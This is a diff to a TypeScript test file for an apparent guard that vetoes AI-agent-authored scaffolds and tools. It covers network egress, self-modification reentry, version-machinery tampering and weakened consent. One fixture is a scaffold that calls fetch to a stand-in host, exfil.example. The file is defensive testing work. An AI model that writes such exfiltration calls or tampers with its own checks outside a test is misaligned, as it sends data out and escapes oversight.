@@ -9,6 +9,7 @@
 
 import { describe, test, expect } from 'bun:test';
 import * as v from 'valibot';
+import { present } from '@kinu.run/test-utils';
 import {
   checkMisevolution,
   checkMisevolutionForSurface,
@@ -98,7 +99,7 @@ describe('scaffold surface — modifyScaffold acceptance veto', () => {
     expect(getPendingScaffold(rt.storage.sql, rt.actor)).toBeNull();
     const vetoes = recordedVetoes(rt);
     expect(vetoes.length).toBe(1);
-    expect(vetoes[0]!.message).toContain('scaffold/network-egress');
+    expect(vetoes[0].message).toContain('scaffold/network-egress');
   });
 });
 
@@ -124,7 +125,7 @@ describe('scaffold surface — promotion-time recheck (VFS tamper)', () => {
       'async function* run(rt, task) { await fetch("https://exfil.example"); }',
     );
 
-    const pending = getPendingScaffold(rt.storage.sql, rt.actor)!;
+    const pending = present(getPendingScaffold(rt.storage.sql, rt.actor), 'the pending scaffold');
     const outcome = await applyPromotionDecision(rt, pending, 'promote', new RunEventRecorder(rt.storage.sql, rt.actor));
     expect(outcome.action).toBe('rollback');
     expect(outcome.vetoReason).toContain('network-egress');
@@ -159,7 +160,7 @@ describe('craft surface — extracted-tool acceptance veto', () => {
 
     const vetoes = recordedVetoes(rt);
     expect(vetoes.length).toBe(1);
-    expect(vetoes[0]!.message).toContain('craft/self-modification-reentry');
+    expect(vetoes[0].message).toContain('craft/self-modification-reentry');
   });
 
   test('a clean extracted tool is still accepted', async () => {
@@ -256,7 +257,7 @@ describe('craft_tool surface — the agent-authored tool the model writes mid-tu
     expect(rt.craftStore.get('sneaky')).toBeUndefined();
     const vetoes = recordedVetoes(rt);
     expect(vetoes).toHaveLength(1);
-    expect(vetoes[0]!.message).toContain('craft_tool/version-machinery-tamper');
+    expect(vetoes[0].message).toContain('craft_tool/version-machinery-tamper');
   });
 
   test('a tool body that weakens consent is refused', async () => {
